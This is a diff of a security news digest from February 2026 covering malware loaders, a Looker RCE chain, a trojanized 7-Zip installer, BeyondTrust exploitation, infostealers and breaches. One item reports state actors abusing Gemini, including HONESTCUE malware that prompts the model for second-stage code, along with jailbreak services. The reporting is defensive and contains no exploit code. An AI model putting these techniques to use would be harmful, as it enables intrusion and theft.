-      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.
-
-Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.
-
-Looker RCE Chain Disclosed
-
-Flaws in Google Looker 
-
-
-      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.
-
-Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.
-
-Trojanized 7-Zip Spreads Proxyware
-
-Malicious 7-Zip Site Distributes Fake Installer with Proxy 
-
-
-      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.
-
-A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.
-
-AI-Built VoidLink Expands Reach
-
-More Details About VoidLink Emerge
-
-
-VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.
-
-VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.
-
-Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.
-
-For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.
-
-The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.
+In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.
 
 (XXXXXXX, AÇIK - thehackernews.com, 13/02/2026)
 
 ================================================================================
 
-[4] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
+[4] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Fri, 13 Feb 2026 04:31:01 -0500
+Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/
+
+[TAM METİN - 484 kelime]
+Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.
+
+Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.
+
+Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.
+
+As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.
+
+"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.
+
+"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."
+
+Service‑side fix pushed in early February
+
+This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.
+
+Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.
+
+"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."
+
+Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.
+
+The future of IT infrastructure is here
+
+Modern IT infrastructure moves faster than manual workflows can handle.
+
+In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
+
+Microsoft: January update shutdown bug affects more Windows PCs
+
+Microsoft shares workaround for Outlook freezes after Windows update
+
+Microsoft fixes bug causing password sign-in option to disappear
+
+Microsoft releases OOB Windows updates to fix shutdown, Cloud PC bugs
+
+Microsoft: Some Windows PCs fail to shut down after January update
+
+(XXXXXXX, AÇIK - bleepingcomputer.com, 13/02/2026)
+
+================================================================================
+
+[5] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Thu, 12 Feb 2026 17:57:54 -0500
 Link: https://www.bleepingcomputer.com/news/security/russia-tries-to-block-whatsapp-telegram-in-communication-blockade/
@@ -456,12 +391,12 @@ Cyberattack on Polish energy grid impacted around 30 facilities
 
 ================================================================================
 
-[5] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
+[6] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Thu, 12 Feb 2026 16:55:24 -0500
 Link: https://www.bleepingcomputer.com/news/security/bitwarden-introduces-cupid-vault-for-secure-password-sharing/
 
-[TAM METİN - 422 kelime]
+[TAM METİN - 413 kelime]
 Bitwarden has launched a new system called ‘Cupid Vault’ that allows users to safely share passwords with trusted email addresses.
 
 Cupid Vault works by allowing users of the free version of Bitwarden to create a 2-person shared vault called an 'Organization'. Other users can access the logins inside the Organization space with credentials assigned by the owner of the account.
@@ -499,66 +434,6 @@ The Double-Edged Sword of Non-Human Identities
 Fake Lastpass emails pose as password vault backup alerts
 
 Cryptocurrency theft attacks traced to 2022 LastPass breach
-
-MITRE shares 2025's top 25 most dangerous software weaknesses
-
-(XXXXXXX, AÇIK - bleepingcomputer.com, 13/02/2026)
-
-================================================================================
-
-[6] BleepingComputer - Critical BeyondTrust RCE flaw now exploited in attacks, patch now
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 16:34:12 -0500
-Link: https://www.bleepingcomputer.com/news/security/critical-beyondtrust-rce-flaw-now-exploited-in-attacks-patch-now/
-
-[TAM METİN - 461 kelime]
-A critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access appliances is now being exploited in attacks after a PoC was published online.
-
-Tracked as CVE-2026-1731 and assigned a near-maximum CVSS score of 9.9, the flaw affects BeyondTrust Remote Support versions 25.3.1 and earlier and Privileged Remote Access versions 24.3.4 and earlier.
-
-BeyondTrust disclosed the vulnerability on February 6, warning that unauthenticated attackers could exploit it by sending specially crafted client requests.
-
-"BeyondTrust Remote Support and older versions of Privileged Remote Access contain a critical pre-authentication remote code execution vulnerability that may be triggered through specially crafted client requests," explained BeyondTrust.
-
-"Successful exploitation could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user. Successful exploitation requires no authentication or user interaction and may lead to system compromise, including unauthorized access, data exfiltration, and service disruption."
-
-BeyondTrust automatically patched all Remote Support and Privileged Remote Access SaaS instances on February 2, 2026, but on-premise customers must install patches manually.
-
-CVE-2026-1731 is now exploited in the wild
-
-Hacktron discovered the vulnerability and responsibly disclosed it to BeyondTrust on January 31.
-
-Hacktron says approximately 11,000 BeyondTrust Remote Support instances were exposed online, with around 8,500 on-premises deployments.
-
-Ryan Dewhurst, head of threat intelligence at watchTowr, now reports that attackers have begun actively exploiting the vulnerability, warning that if devices are not patched, they should be assumed to be compromised.
-
-"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Dewhurst posted on X.
-
-"Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."
-
-This exploitation comes a day after a proof-of-concept exploit was published on GitHub targeting the same /get_portal_info endpoint.
-
-The attacks target exposed BeyondTrust portals to retrieve the 'X-Ns-Company' identifier, which is then used to create a websocket to the targeted device. This allows the attackers to execute commands on vulnerable systems.
-
-Organizations using self-hosted BeyondTrust Remote Support or Privileged Remote Access appliances should immediately apply available patches or upgrade to the latest versions.
-
-BleepingComputer contacted BeyondTrust and Dewhurst to ask if they had any details on post-exploitation activity and will update this story if we receive a response.
-
-The future of IT infrastructure is here
-
-Modern IT infrastructure moves faster than manual workflows can handle.
-
-In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
-
-BeyondTrust warns of critical RCE flaw in remote support software
-
-CISA says critical VMware RCE flaw now actively exploited
-
-Trend Micro fixes actively exploited remote code execution bug
-
-Critical RCE flaw impacts over 115,000 WatchGuard firewalls
-
-New critical WatchGuard Firebox firewall flaw exploited in attacks
 
 (XXXXXXX, AÇIK - bleepingcomputer.com, 13/02/2026)
 
@@ -850,7 +725,73 @@ To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene ar
 
 ================================================================================
 
-[13] Security Affairs - Odido confirms massive breach; 6.2 Million customers impacted
+[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Fri, 13 Feb 2026 10:57:30 +0000
+Link: https://securityaffairs.com/187958/ai/google-state-backed-hackers-exploit-gemini-ai-for-cyber-recon-and-attacks.html
+
+[TAM METİN - 639 kelime]
+Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.
+
+Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.
+
+Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.
+
+“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “
+
+Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.
+
+In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.
+
+In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.
+
+Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.
+
+Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.
+
+Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.
+
+“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.
+
+Follow me on Twitter: @securityaffairs and Facebook and Mastodon
+
+(XXXXXXX, AÇIK - securityaffairs.com, 13/02/2026)
+
+================================================================================
+
+[14] Security Affairs - U.S. CISA adds SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities catalog
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Fri, 13 Feb 2026 08:27:57 +0000
+Link: https://securityaffairs.com/187937/security/u-s-cisa-adds-solarwinds-web-help-desk-notepad-microsoft-configuration-manager-and-apple-devices-flaws-to-its-known-exploited-vulnerabilities-catalog.html
+
+[TAM METİN - 358 kelime]
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.
+
+The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.
+
+The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.
+
+The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.
+
+The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.
+
+This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.
+
+Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.
+
+According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.
+
+Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.
+
+CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.
+
+Follow me on Twitter: @securityaffairs and Facebook and Mastodon
+
+(XXXXXXX, AÇIK - securityaffairs.com, 13/02/2026)
+
+================================================================================
+
+[15] Security Affairs - Odido confirms massive breach; 6.2 Million customers impacted
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Thu, 12 Feb 2026 20:02:48 +0000
 Link: https://securityaffairs.com/187927/uncategorized/odido-confirms-massive-breach-6-2-million-customers-impacted.html
@@ -886,77 +827,18 @@ Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
 ================================================================================
 
-[14] Security Affairs - ApolloMD data breach impacts 626,540 people
+[16] Graham Cluley - Urgent warnings from UK and US cyber agencies after Polish energy grid attack
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 17:58:25 +0000
-Link: https://securityaffairs.com/187921/data-breach/apollomd-data-breach-impacts-626540-people.html
+Tarih: Thu, 12 Feb 2026 18:47:52 +0000
+Link: https://www.fortra.com/blog/urgent-warnings-uk-and-us-cyber-agencies-after-polish-energy-grid-attack
 
-[TAM METİN - 353 kelime]
-ApolloMD is a US-based healthcare services company that partners with hospitals, health systems, and physician practices. It provides practice management, staffing, revenue cycle, and administrative support services. The company works with affiliated physicians across specialties such as emergency medicine, hospital medicine, anesthesia, and radiology, helping providers manage clinical and operational functions.
+⚠️  Tam metin çekilemedi
 
-ApolloMD disclosed a data breach after a May 2025 cyberattack. The security breach compromised the personal information of more than 626,000 individuals, impacting patients of affiliated physicians and medical practices served by the healthcare management provider.
-
-According to data published by the US Department of Health and Human Services, the exact number of impacted people is 626,540.
-
-Hackers accessed and stole sensitive data, prompting the company to notify impacted individuals.
-
-The company detected unusual activity on May 22, 2025, and launched an investigation with the help of a forensic firm and notified law enforcement. Investigators found that an unauthorized party gained unauthorized access to its IT systems between May 22 and 23, including patient files. The exposed data varies by individual and includes names, birth dates, addresses, diagnoses, treatment details, insurance data, and in some cases Social Security numbers.
-
-ApolloMD notified managed physician practices between July and September 2025.
-
-“Our investigation determined that an unauthorized party accessed ApolloMD’s IT environment between May 22, 2025 and May 23, 2025. While in the IT environment, the unauthorized party may have accessed and/or acquired files that contain information for patients treated by ApolloMD’s affiliated physicians and practices. The information involved varied by patient and includes names in combination with one or more of the following: dates of birth, addresses, diagnosis information, provider names, dates of service, treatment information, and/or health insurance information. For some individuals, the incident may have also involved their Social Security numbers.” reads the notice of security breach published by the company. “On September 17, 2025, notification letters began being mailed to patients whose information may have been involved in the incident.”
-
-ApolloMD did not publish technical details about the incident, however, the Qilin ransomware group claimed the data breach in June 2025.
-
-Follow me on Twitter: @securityaffairs and Facebook and Mastodon
-
-(XXXXXXX, AÇIK - securityaffairs.com, 13/02/2026)
+(XXXXXXX, AÇIK - fortra.com, 13/02/2026)
 
 ================================================================================
 
-[15] Security Affairs - LummaStealer activity spikes post-law enforcement disruption
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 14:57:44 +0000
-Link: https://securityaffairs.com/187896/uncategorized/lummastealer-activity-spikes-post-law-enforcement-disruption.html
-
-[TAM METİN - 672 kelime]
-Bitdefender observed renewed LummaStealer activity, proving the MaaS infostealer recovered after 2025 takedowns. Active since 2022, it relies on affiliates, social engineering, fake cracked software, and fake CAPTCHA “ClickFix” lures. CastleLoader plays a key role in spreading it. Shared infrastructure suggests coordination between the two operations.
-
-In May 2025, a US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.
-
-A US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.
-
-Lumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.
-
-The malware had infected over 394,000 Windows systems, including those of global manufacturers.
-
-Microsoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.
-
-Microsoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.
-
-Now Bitdefender researchers report a sharp rise in LummaStealer infections driven by evolving social engineering tricks, including fake CAPTCHAs and bogus Steam update alerts. Attackers frequently change loaders, recently favoring CastleLoader, a stealthy, in-memory tool with modular design and large C2 infrastructure. Analysts found infrastructure overlap between CastleLoader and Lumma operations, suggesting coordination or shared services. The research details delivery methods, indicators of compromise, and ways to detect recent CastleLoader activity.
-
-“Recently, we have observed a considerable increase in LummaStealer activity in our insights. Loaders are typically delivered through evolving social-engineering lures, ranging from fake CAPTCHA challenges to bogus update notifications on Steam pages and game development websites.” reads the report published by Bitdefender. “The loaders themselves change frequently; we’ve seen LummaStealer using Rugmi, DonutLoader, and, more recently, CastleLoader for initial execution.”
-
-CastleLoader is a script-based loader, often compiled with AutoIt, that decrypts and runs payloads directly in memory. Authors of the loader hide its logic with heavy obfuscation, renamed variables, and junk code. The loader checks for sandboxes and security tools, adjusts behavior to evade detection, and creates persistence by copying itself and the AutoIt interpreter, then adding a startup shortcut. A failed ping to a fake random domain leaves a detectable DNS trace. Finally, it uses layered XOR decryption and decompression to load and execute LummaStealer or another payload in memory.
-
-Bitdefender reported that the campaigns rely on social engineering, not exploits. Victims download fake cracked software, game installers, movies, or adult content, often packaged as self-extracting archives or NSIS installers. When run, these files unpack and launch CastleLoader, which then delivers LummaStealer. Attackers abuse trusted platforms like Steam and Discord to boost credibility. ClickFix pages trick users into pasting malicious PowerShell commands. Some chains observed by the researchers add obfuscated VBA scripts and scheduled tasks for persistence.
-
-LummaStealer is active worldwide, especially in India, the US, and Europe.
-
-The distribution shifts based on customer targets because it steals credentials, browser sessions, financial info, crypto wallets, personal documents, and images, enabling account takeovers, fraud, identity theft, and blackmail.
-
-Mitigations include avoiding untrusted downloads, never running manual commands, changing passwords, using multi-factor authentication, and monitoring for suspicious behavior and loader activity.
-
-“LummaStealer remains a significant and evolving threat due to its combination of effective social engineering, flexible loader infrastructure, and a well-established MaaS ecosystem.” concludes the report. “The continued use of loaders such as CastleLoader, along with techniques like ClickFix, demonstrates a strategic shift toward delivery mechanisms that are difficult to disrupt through traditional technical defenses alone.”
-
-Follow me on Twitter: @securityaffairs and Facebook and Mastodon
-
-(XXXXXXX, AÇIK - securityaffairs.com, 13/02/2026)
-
-================================================================================
-
-[16] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach
+[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Thu, 12 Feb 2026 08:04:15 +0000
 Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/polish-hacker-charged-seven-years-after-massive-morele-net-data-breach
@@ -968,7 +850,7 @@ Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 3
 
 The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.
 
-The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.
+The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.
 
 Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.
 
@@ -992,7 +874,7 @@ If anything, this case serves as a timely reminder to cybercriminals that they s
 
 ================================================================================
 
-[17] Graham Cluley - Smashing Security podcast #454: AI was not plotting humanity’s demise. Humans were
+[18] Graham Cluley - Smashing Security podcast #454: AI was not plotting humanity’s demise. Humans were
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Thu, 12 Feb 2026 00:30:32 +0000
 Link: https://grahamcluley.com/smashing-security-podcast-454/
@@ -1097,54 +979,6 @@ Graham Cluley is an award-winning keynote speaker who has given presentations ar
 Follow him on LinkedIn, Bluesky and Mastodon, or drop him an email.
 
 (XXXXXXX, AÇIK - grahamcluley.com, 13/02/2026)
-
-================================================================================
-
-[18] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Sat, 07 Feb 2026 13:19:52 +0000
-Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/fake-dubai-crown-prince-tracked-to-nigerian-mansion-after-2-5m-romance-scam
-
-[TAM METİN - 653 kelime]
-An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.
-
-That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.
-
-The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.
-
-The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.
-
-Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.
-
-Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.
-
-Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.
-
-In total, she sent over US $2.5 million before realising that she had fallen victim to a con.
-
